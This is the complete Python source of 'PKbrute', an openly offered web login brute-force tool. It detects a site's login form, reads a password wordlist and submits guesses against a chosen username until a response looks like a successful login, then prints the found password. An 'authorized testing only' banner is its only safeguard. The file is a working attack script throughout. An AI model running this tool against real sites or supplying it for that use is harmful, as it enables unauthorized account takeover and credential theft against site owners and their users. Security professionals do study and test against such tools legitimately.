#!/usr/bin/env python3
"""
PKbrute - Web Login Brute Force Tool
Developed by Pankaj
For authorized security testing only
"""

import requests
import sys
import time
import threading
from urllib.parse import urljoin, urlparse
from colorama import init, Fore, Style
import os

# Initialize colorama for cross-platform colors
init(autoreset=True)

# Branding
BANNER = f"""
{Fore.CYAN}{'='*60}
{Fore.YELLOW}███╗   ██╗██╗  ██╗██████╗ ██████╗ ██╗   ██╗████████╗███████╗
{Fore.YELLOW}████╗  ██║██║  ██║██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
{Fore.YELLOW}██╔██╗ ██║███████║██████╔╝██████╔╝██║   ██║   ██║   █████╗  
{Fore.YELLOW}██║╚██╗██║██╔══██║██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
{Fore.YELLOW}██║ ╚████║██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
{Fore.YELLOW}╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
{Fore.GREEN}                    Web Login Brute Force Tool
{Fore.MAGENTA}                  Developed by Pankaj | PKbrute v1.0
{Fore.CYAN}{'='*60}
{Fore.RED}[!] Use only on authorized systems. Illegal use is prohibited.
{Style.RESET_ALL}
"""

class PKbrute:
    def __init__(self):
        self.session = requests.Session()
        self.results = []
        self.stop_flag = False
        self.successful_login = None
        
    def print_banner(self):
        print(BANNER)
        
    def detect_login_form(self, url):
        """Detect login form automatically"""
        print(f"{Fore.CYAN}[*] Analyzing target URL...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(url, timeout=10, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
            })
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            
            for form in forms:
                # Check if form has password field
                password_fields = form.find_all('input', {'type': 'password'})
                if password_fields:
                    # Found login form
                    action = form.get('action', '')
                    method = form.get('method', 'post').lower()
                    
                    # Get username field
                    username_field = None
                    for input_field in form.find_all('input'):
                        field_type = input_field.get('type', 'text')
                        if field_type in ['text', 'email', 'username']:
                            username_field = input_field.get('name', 'username')
                            break
                    
                    if not username_field:
                        username_field = 'username'
                    
                    password_field = password_fields[0].get('name', 'password')
                    
                    return {
                        'action': urljoin(url, action),
                        'method': method,
                        'username_field': username_field,
                        'password_field': password_field,
                        'form_found': True
                    }
            
            return {'form_found': False}
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error detecting login form: {e}{Style.RESET_ALL}")
            return {'form_found': False}
    
    def manual_login_form(self):
        """Manual login form input if auto-detection fails"""
        print(f"{Fore.YELLOW}[!] Auto-detection failed. Manual input required.{Style.RESET_ALL}")
        
        login_url = input(f"{Fore.CYAN}[?] Enter login form action URL: {Style.RESET_ALL}")
        method = input(f"{Fore.CYAN}[?] Enter form method (post/get): {Style.RESET_ALL}").lower()
        username_field = input(f"{Fore.CYAN}[?] Enter username field name: {Style.RESET_ALL}")
        password_field = input(f"{Fore.CYAN}[?] Enter password field name: {Style.RESET_ALL}")
        
        # Optional additional fields
        additional = input(f"{Fore.CYAN}[?] Additional POST data (key=value, comma separated, or press Enter): {Style.RESET_ALL}")
        additional_data = {}
        if additional:
            for item in additional.split(','):
                if '=' in item:
                    k, v = item.strip().split('=', 1)
                    additional_data[k] = v
        
        return {
            'action': login_url,
            'method': method,
            'username_field': username_field,
            'password_field': password_field,
            'additional_data': additional_data,
            'form_found': True
        }
    
    def test_credentials(self, url, form_data, username, password):
        """Test a single credential pair"""
        if self.stop_flag:
            return None
            
        # Prepare data
        data = {}
        data[form_data['username_field']] = username
        data[form_data['password_field']] = password
        
        # Add additional data if any
        if 'additional_data' in form_data:
            data.update(form_data['additional_data'])
        
        try:
            if form_data['method'] == 'post':
                response = self.session.post(url, data=data, timeout=5, 
                                           headers={'User-Agent': 'Mozilla/5.0'})
            else:
                response = self.session.get(url, params=data, timeout=5,
                                          headers={'User-Agent': 'Mozilla/5.0'})
            
            # Check for successful login (customize these indicators)
            success_indicators = [
                'dashboard', 'welcome', 'home', 'logout', 'profile',
                'admin', 'success', 'redirect'
            ]
            
            response_lower = response.text.lower()
            response_url = response.url.lower()
            
            # Check if redirected away from login page
            if 'login' not in response_url and urlparse(url).path != urlparse(response.url).path:
                return True
            
            # Check for success indicators in content
            for indicator in success_indicators:
                if indicator in response_lower:
                    return True
            
            # Check for failure indicators
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error', 'try again'
            ]
            
            for indicator in failure_indicators:
                if indicator in response_lower and 'password' in response_lower:
                    return False
            
            # If no clear indicators, assume failure
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            return None
    
    def brute_force(self, url, form_data, username, wordlist_path):
        """Main brute force attack"""
        # Load wordlist
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Fore.RED}[!] Cannot read wordlist: {e}{Style.RESET_ALL}")
            return
        
        total = len(passwords)
        print(f"{Fore.CYAN}[*] Loaded {total} passwords from wordlist{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Starting brute force attack...{Style.RESET_ALL}")
        
        start_time = time.time()
        attempt = 0
        
        for idx, password in enumerate(passwords, 1):
            if self.stop_flag:
                break
                
            attempt += 1
            print(f"{Fore.YELLOW}[>] Trying password {idx}/{total}: {password[:10]}{'...' if len(password) > 10 else ''}{Style.RESET_ALL}", end='\r')
            
            result = self.test_credentials(url, form_data, username, password)
            
            if result is True:
                print(f"\n{Fore.GREEN}{'='*60}")
                print(f"{Fore.GREEN}[✓] SUCCESS! Password found: {password}")
                print(f"{Fore.GREEN}[✓] Username: {username}")
                print(f"{Fore.GREEN}[✓] Password: {password}")
                print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                self.successful_login = (username, password)
                self.stop_flag = True
                return True
            
            # Rate limiting to avoid lockouts
            time.sleep(0.1)
        
        elapsed = time.time() - start_time
        print(f"\n{Fore.RED}{'='*60}")
        print(f"{Fore.RED}[✗] Attack completed. No valid password found.")
        print(f"{Fore.RED}[✗] Tried {attempt} passwords in {elapsed:.2f} seconds")
        print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
        return False
    
    def run(self):
        """Main execution flow"""
        self.print_banner()
        
        # Get target URL
        target_url = input(f"{Fore.CYAN}[?] Enter target login page URL: {Style.RESET_ALL}").strip()
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        # Detect login form
        print(f"{Fore.CYAN}[*] Detecting login form...{Style.RESET_ALL}")
        form_data = self.detect_login_form(target_url)
        
        if not form_data['form_found']:
            print(f"{Fore.YELLOW}[!] Could not auto-detect login form{Style.RESET_ALL}")
            form_data = self.manual_login_form()
        else:
            print(f"{Fore.GREEN}[✓] Login form detected!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Action URL: {form_data['action']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Method: {form_data['method']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Username field: {form_data['username_field']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Password field: {form_data['password_field']}{Style.RESET_ALL}")
        
        # Get username
        username = input(f"{Fore.CYAN}[?] Enter username to test: {Style.RESET_ALL}").strip()
        
        # Get wordlist path
        wordlist_path = input(f"{Fore.CYAN}[?] Enter password wordlist path: {Style.RESET_ALL}").strip()
        if not os.path.exists(wordlist_path):
            print(f"{Fore.RED}[!] Wordlist not found!{Style.RESET_ALL}")
            sys.exit(1)
        
        # Confirm attack
        print(f"{Fore.RED}{'='*60}")
        confirm = input(f"{Fore.RED}[!] Ready to start brute force attack? (yes/no): {Style.RESET_ALL}")
        if confirm.lower() != 'yes':
            print(f"{Fore.YELLOW}[!] Attack cancelled.{Style.RESET_ALL}")
            sys.exit(0)
        
        # Execute attack
        action_url = form_data.get('action', target_url)
        self.brute_force(action_url, form_data, username, wordlist_path)
        
        if not self.successful_login:
            print(f"{Fore.YELLOW}[!] No successful login found.{Style.RESET_ALL}")

def main():
    if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:
        print(f"""
{PKbrute.__doc__}
Usage:
    python3 pkbrute.py

Requirements:
    pip install requests beautifulsoup4 colorama
        """)
        sys.exit(0)
    
    # Check for required libraries
    try:
        import requests
        from bs4 import BeautifulSoup
        from colorama import Fore, Style, init
    except ImportError:
        print(f"{Fore.RED}[!] Missing required libraries. Install with:{Style.RESET_ALL}")
        print("pip install requests beautifulsoup4 colorama")
        sys.exit(1)
    
    tool = PKbrute()
    try:
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attack interrupted by user{Style.RESET_ALL}")
        sys.exit(0)

if __name__ == "__main__":
    main()
